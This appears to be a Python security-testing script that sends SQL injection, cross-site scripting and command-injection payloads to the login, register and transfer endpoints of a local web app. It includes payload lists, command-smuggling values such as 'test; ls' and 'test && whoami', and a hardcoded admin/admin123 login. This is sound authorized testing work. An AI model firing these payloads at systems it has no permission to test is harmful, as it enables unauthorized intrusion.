"""
Security Assessment Script: Input Validation
- Tests for injection vulnerabilities (SQL injection, XSS, command injection)

USAGE: python input_validation_test.py

WARNING: Only use this script on systems you own or have explicit permission to test.
"""
import requests
import re

BASE_URL = "http://localhost:5000"  # Change as needed
LOGIN_ENDPOINT = "/login"
REGISTER_ENDPOINT = "/register"
TRANSFER_ENDPOINT = "/transfer"

# Payloads for testing
SQLI_PAYLOADS = [
    "' OR '1'='1", "' OR 1=1--", "' OR ''='", '" OR "1"="1', 'admin"--', "' OR 1=1#"
]
XSS_PAYLOADS = [
    '<script>alert(1)</script>', '" onmouseover="alert(1)', "<img src=x onerror=alert(1)>"
]
CMDI_PAYLOADS = [
    'test; ls', 'test && whoami', 'test | dir', 'test | echo vulnerable'
]


def get_csrf_token(session, url):
    resp = session.get(url)
    match = re.search(r'name="csrf_token" type="hidden" value="([^"]+)"', resp.text)
    return match.group(1) if match else ""


def test_sql_injection():
    print("[+] Testing for SQL Injection on login and register...")
    session = requests.Session()
    for payload in SQLI_PAYLOADS:
        # Test login
        csrf_token = get_csrf_token(session, BASE_URL + LOGIN_ENDPOINT)
        data = {"username": payload, "password": payload, "csrf_token": csrf_token}
        resp = session.post(BASE_URL + LOGIN_ENDPOINT, data=data, allow_redirects=False)
        if resp.status_code == 302 and "session" in resp.headers.get("Set-Cookie", ""):
            print(f"[!] Possible SQL injection vulnerability on login with payload: {payload}")
        # Test register
        csrf_token = get_csrf_token(session, BASE_URL + REGISTER_ENDPOINT)
        data = {"username": payload, "email": f"{payload}@test.com", "password": payload, "csrf_token": csrf_token}
        resp = session.post(BASE_URL + REGISTER_ENDPOINT, data=data, allow_redirects=False)
        if resp.status_code == 302:
            print(f"[!] Possible SQL injection vulnerability on register with payload: {payload}")
    print("[+] SQL Injection tests completed.")


def test_xss():
    print("[+] Testing for XSS on register...")
    session = requests.Session()
    for payload in XSS_PAYLOADS:
        csrf_token = get_csrf_token(session, BASE_URL + REGISTER_ENDPOINT)
        data = {"username": payload, "email": f"{payload}@test.com", "password": "Testpass1!", "csrf_token": csrf_token}
        resp = session.post(BASE_URL + REGISTER_ENDPOINT, data=data)
        if payload in resp.text:
            print(f"[!] Possible XSS vulnerability: payload reflected in response: {payload}")
    print("[+] XSS tests completed.")


def test_cmd_injection():
    print("[+] Testing for Command Injection on transfer (if applicable)...")
    session = requests.Session()
    # You may need to login first to access /transfer
    csrf_token = get_csrf_token(session, BASE_URL + LOGIN_ENDPOINT)
    data = {"username": "admin", "password": "admin123", "csrf_token": csrf_token}
    session.post(BASE_URL + LOGIN_ENDPOINT, data=data)
    for payload in CMDI_PAYLOADS:
        csrf_token = get_csrf_token(session, BASE_URL + TRANSFER_ENDPOINT)
        data = {"recipient_username": payload, "amount": "1", "transfer_type": "username", "csrf_token": csrf_token}
        resp = session.post(BASE_URL + TRANSFER_ENDPOINT, data=data)
        if "root" in resp.text or "uid=" in resp.text or "vulnerable" in resp.text:
            print(f"[!] Possible command injection vulnerability with payload: {payload}")
    print("[+] Command Injection tests completed.")


def main():
    test_sql_injection()
    print()
    test_xss()
    print()
    test_cmd_injection()

if __name__ == "__main__":
    main()
